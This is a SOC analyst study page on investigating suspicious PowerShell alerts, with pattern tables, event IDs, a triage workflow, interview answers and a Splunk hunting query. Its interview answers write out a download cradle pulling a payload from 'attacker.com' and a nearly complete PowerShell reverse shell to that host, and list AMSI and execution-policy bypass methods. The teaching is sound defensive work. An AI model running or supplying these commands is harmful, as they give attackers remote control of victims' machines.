# 💻 Suspicious PowerShell Activity

PowerShell is the most abused tool in modern attacks. Nearly every advanced threat actor uses it because it's built into Windows, bypasses many legacy controls, and can be used entirely in memory. Being able to analyze PowerShell alerts confidently is essential for any SOC analyst.
{ .page-lead }

!!! note "Why PowerShell is a high-value alert"
    PowerShell has legitimate administrative uses everywhere in IT — that's exactly why attackers use it. It can download files, run in memory without touching disk, bypass execution policies, connect to remote systems, and perform nearly every attack technique in the MITRE ATT&CK framework. Every PowerShell alert deserves investigation.

---

## Suspicious PowerShell Patterns

| Pattern | What It Suggests | Technique |
|---------|-----------------|-----------|
| `-EncodedCommand` / `-enc` | Command obfuscated in Base64 | T1027 Obfuscated Files |
| `IEX` / `Invoke-Expression` | Executes a string as code — download cradle | T1059.001 PowerShell |
| `DownloadString`, `DownloadFile`, `WebClient` | Downloads content from internet | T1105 Ingress Tool Transfer |
| `certutil -decode` or `certutil -urlcache` | LOLBin used to download/decode payload | T1105 |
| `Set-ExecutionPolicy Bypass` | Disables execution policy check | T1059.001 |
| `powershell.exe -nop -win hidden` | Hidden, no-profile, no interactive window | T1059.001 |
| `-NonInteractive -NoProfile -WindowStyle Hidden` | Fully hidden execution | T1059.001 |
| `Invoke-Mimikatz`, `sekurlsa`, `kerberos` | Credential dumping | T1003 |
| `Add-MpPreference -ExclusionPath` | Adds Windows Defender exclusion | T1562 Impair Defenses |
| `sc stop`, `net stop` | Stopping security services | T1489 Service Stop |
| `schtasks /create`, `New-ScheduledTask` | Persistence via scheduled task | T1053 |
| `AMSI` strings, reflection bypass | Bypasses AMSI scanning | T1562 |

---

## What to Check (SOC L1 Checklist)

| Priority | Field | What You Are Looking For |
|----------|-------|--------------------------|
| 🔴 First | **Parent process** | What launched PowerShell? `Word.exe`? `mshta.exe`? |
| 🔴 First | **Full command line** | Is it encoded? Does it contain download cradles? |
| 🟡 Second | **User context** | Admin? Standard user? Service account? |
| 🟡 Second | **Network connections** | Did the PowerShell process connect outbound? |
| 🟠 Third | **Script block logging** | Is PSScriptBlock or Module logging enabled? Pull logs |
| 🟠 Third | **Time and frequency** | One-off script or recurring? (scheduled task?) |
| 🟠 Third | **AMSI detection** | Did AMSI flag any loaded script content? |
| 🟢 Fourth | **Files written** | Did the process write any files to disk? |

---

## Key Windows Event IDs for PowerShell

| Event ID | Log | What It Records |
|----------|-----|----------------|
| **4103** | Microsoft-Windows-PowerShell/Operational | Module logging — logs all module activity |
| **4104** | Microsoft-Windows-PowerShell/Operational | **Script Block Logging** — logs the full content of every script block, even decoded |
| **4688** | Security | Process creation — logs command line if auditing is enabled |
| **400/800** | PowerShell | Engine start/stop events |
| **7045** | System | New service installed — may follow a PowerShell session |

---

## Investigation Workflow

### Phase 1 — Decode the Command (if encoded)

If you see `-EncodedCommand` or `-enc` followed by a Base64 string:

```powershell
# Decode in PowerShell:
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('BASE64STRING'))
```

Or use **CyberChef**: From Base64 → Decode text (UTF-16LE encoding)

### Phase 2 — Analyze the Decoded Command

Look for:
- **Download cradles**: `(New-Object Net.WebClient).DownloadString('http://...')`, `IEX`
- **In-memory execution**: code loaded directly into memory without file on disk
- **Credential access**: mentions of LSASS, SAM, Mimikatz keywords
- **Persistence**: scheduled tasks, registry modifications, startup folder writes
- **Defense evasion**: Defender exclusions, AMSI bypass strings

### Phase 3 — Context Check

- Is this a known admin script? Check with the system owner
- Is this a pentest or red team engagement? Check the change log
- Is the user account a service account that would legitimately run scripts?

### Phase 4 — Contain if Malicious

- Terminate the PowerShell process via EDR if still running
- Isolate the host if download cradles executed or files were dropped
- Block the C2 URL/IP at the proxy and firewall
- Check for persistence mechanisms created during the session

---

## Interview Questions & Answers

**Q1. Why is PowerShell such a common attack tool?**

> "PowerShell is deeply integrated into Windows, widely whitelisted by security tools, can operate entirely in memory without touching disk, has access to the entire .NET framework and Windows API, can communicate over HTTP/HTTPS, and can be invoked in hidden non-interactive mode. Because it's a legitimate admin tool, blocking it entirely breaks IT operations. Attackers exploit this trust. Nearly every stage of a modern attack chain — from initial access to exfiltration — can be executed using PowerShell alone."

**Q2. What is an AMSI bypass and why is it significant?**

> "AMSI — the Antimalware Scan Interface — is a Windows API that allows security products to scan script content at runtime, even if it's decoded or loaded in memory. Security tools hook into AMSI to inspect PowerShell, VBScript, JScript, and other script content before execution. An AMSI bypass is a technique attackers use to disable or corrupt the AMSI context so their script is not scanned. Common bypass techniques involve reflecting into the `System.Management.Automation` assembly and patching the `AmsiScanBuffer` function in memory. Detecting AMSI bypass attempts — like strings `amsi`, `AmsiScanBuffer` used in reflection or patching — is a high-confidence signal of malicious intent."

**Q3. What is Script Block Logging and why should it be enabled?**

> "Script Block Logging, enabled via Event ID 4104 in the Microsoft-Windows-PowerShell/Operational log, records the full content of every PowerShell script block that executes — crucially, it logs the decoded plaintext even if the command was Base64-encoded or obfuscated when it arrived. This means an attacker cannot hide their commands from logging by encoding them. It should be enabled on all endpoints because it dramatically improves post-incident forensic capability. Without it, you may see that PowerShell ran but not what it actually did."

**Q4. What is a download cradle?**

> "A download cradle is a short PowerShell command that fetches and immediately executes code from a remote URL, often without writing anything to disk. The classic form is: `IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`. The `IEX` — Invoke-Expression — evaluates the downloaded string as PowerShell code in memory. This technique bypasses file-based AV detection because nothing is written to disk. Modern variations use HTTPS, obfuscated URLs, or alternative download methods (like `Invoke-RestMethod`) to evade proxy inspection."

**Q5. How do you decode an encoded PowerShell command?**

> "Encoded commands use Base64 encoding with UTF-16LE (Unicode) character encoding — which is why standard Base64 decoders sometimes produce garbage. The correct method in PowerShell is: `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('ENCODED_STRING'))`. In CyberChef, use the 'From Base64' operation followed by 'Decode text' with UTF-16LE encoding. The decoded result reveals the actual command — which might be another layer of obfuscation, a download cradle, or the actual malicious code."

**Q6. What is 'living off the land' and name five PowerShell-related LOLBins?**

> "Living off the land means using pre-installed, trusted system tools for malicious purposes to evade detection. PowerShell-related LOLBins include: (1) `certutil.exe` — can download files and decode Base64; (2) `mshta.exe` — executes HTML Application files with VBScript/JScript; (3) `regsvr32.exe` — can load COM scriptlets from remote URLs (Squiblydoo technique); (4) `rundll32.exe` — can execute functions from DLLs including remote DLLs; (5) `wmic.exe` — can execute processes locally or on remote machines. These are all legitimate Windows tools that attackers abuse because they're trusted by security products."

**Q7. What does 'PowerShell Constrained Language Mode' do?**

> "PowerShell Constrained Language Mode is a PowerShell security feature that restricts the language to a subset of safe operations — it removes access to .NET types, COM objects, and many reflection techniques that attackers rely on. When CLM is enforced via Windows Defender Application Control (WDAC) or AppLocker, it significantly reduces what an attacker can do with PowerShell, breaking many common attack scripts and AMSI bypass techniques. It's one of the most effective PowerShell hardening controls."

**Q8. What parent processes should never spawn PowerShell?**

> "PowerShell should almost never be spawned by: `winword.exe`, `excel.exe`, `outlook.exe`, or any Office application — this indicates a malicious macro; `mshta.exe` or `wscript.exe` — HTML/VBScript executing PowerShell is a strong malware indicator; `iexplore.exe` or any browser process — browser spawning PowerShell indicates drive-by execution; `java.exe` — web applications spawning PowerShell is a RCE indicator; `sqlservr.exe` — SQL Server spawning PowerShell is a SQL injection to RCE scenario. Any of these parent → PowerShell relationships in the process tree is a high-confidence malicious indicator."

**Q9. What is the PowerShell execution policy and can it be bypassed?**

> "PowerShell's execution policy controls which scripts are allowed to run — options are `Restricted`, `RemoteSigned`, `AllSigned`, and `Unrestricted`. It is a configuration control, not a security boundary. It can be bypassed in multiple ways: running `powershell.exe -ExecutionPolicy Bypass -File script.ps1`, passing the script content as a Base64-encoded command argument, piping script content through stdin, loading script blocks through reflection APIs, or using `Invoke-Expression` to execute a string. Microsoft explicitly states execution policy is not intended as a security feature."

**Q10. What is a PowerShell reverse shell and what does it look like?**

> "A PowerShell reverse shell establishes an interactive command session from the victim's machine back to the attacker's server, giving the attacker a remote command line interface. A basic example: `$client = New-Object System.Net.Sockets.TCPClient('attacker.com', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535...; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()};$client.Close()`. In practice these are heavily obfuscated and encoded."

**Q11. How would you hunt for suspicious PowerShell activity in Splunk?**

> "I'd use SPL to query Windows Security (Event ID 4688) or PowerShell Operational (Event ID 4104) logs, filtering for PowerShell processes and looking for suspicious patterns: `index=windows (EventCode=4688 Image=*powershell* OR EventCode=4104) | regex CommandLine=\"(-enc|-EncodedCommand|IEX|Invoke-Expression|DownloadString|WebClient|bypass|hidden|nop|AMSI)\" | table _time, host, user, CommandLine | sort -_time`. I'd also look for PowerShell spawned from unusual parent processes using process correlation."

**Q12. What is PowerShell remoting and when is it used maliciously?**

> "PowerShell Remoting uses WinRM (Windows Remote Management) over port 5985 (HTTP) or 5986 (HTTPS) to execute PowerShell commands on remote systems. Legitimately, IT uses it for remote administration and automation. Attackers use it for lateral movement — once they have admin credentials, `Enter-PSSession` or `Invoke-Command` allows them to run commands on remote hosts across the network. It's detectable in SIEM through Event ID 4688 with `wsmprovhost.exe` process creation on the target host, and WinRM network connections to port 5985/5986 between hosts."

---

!!! success "Very Short Version (Easy to Remember)"
    - **Parent process first** — `Word.exe → powershell.exe` = macro attack
    - **Decode encoded commands** — UTF-16LE Base64 (`[System.Text.Encoding]::Unicode...`)
    - **Look for download cradles** — `IEX`, `DownloadString`, `WebClient` = in-memory execution
    - **Enable Script Block Logging** (Event 4104) — logs decoded content automatically
    - **AMSI bypass strings** = high-confidence malicious intent, escalate
    - **Whitelist parent processes** — PowerShell from Office apps is always suspicious
